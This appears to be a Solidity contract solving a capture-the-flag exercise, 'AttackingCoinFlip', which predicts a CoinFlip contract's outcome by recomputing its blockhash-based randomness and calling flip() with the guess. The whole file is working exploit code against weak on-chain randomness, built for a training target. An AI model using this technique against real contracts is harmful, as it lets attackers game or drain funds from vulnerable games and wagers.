// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        // Code me!
        console.log(
            "attack: Blockvalue is %s, coinFlip is %s, blocknumber is %s",
            blockValue,
            coinFlip,
            block.number
        );
        CoinFlip coinFlipContract = CoinFlip(contractAddress);
        coinFlipContract.flip(coinFlip == 1 ? true : false);
    }
}
